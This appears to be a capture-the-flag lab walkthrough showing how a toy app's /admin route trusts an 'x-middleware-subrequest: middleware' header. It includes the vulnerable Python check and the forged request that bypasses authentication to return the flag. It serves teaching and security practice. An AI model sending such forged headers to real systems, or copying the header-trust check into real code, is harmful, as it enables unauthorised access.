# Finding the Bug

## Enumerate the application

Start with the homepage:

```
GET /
```

Response: a welcome page with a link to `/admin`.

## Test the protected route

```
GET /admin
```

Response: `401 Unauthorized`. A valid session is required.

## Inspect the source

Look at `lab/app.py`. The `is_authenticated` function checks for a session cookie. The `middleware_bypassed` function checks the `x-middleware-subrequest` header:

```python
def middleware_bypassed(headers) -> bool:
    val = headers.get("x-middleware-subrequest", "")
    return val == MIDDLEWARE_TRUST_VALUE
```

Where `MIDDLEWARE_TRUST_VALUE = "middleware"`.

The `/admin` handler calls both:

```python
if is_authenticated(self.headers) or middleware_bypassed(self.headers):
    # serve flag
```

The header check has no origin validation. Any client that knows the header name and value can bypass the auth check.

## The forge

```
GET /admin
x-middleware-subrequest: middleware
```

The middleware_bypassed function returns True. The flag is returned.
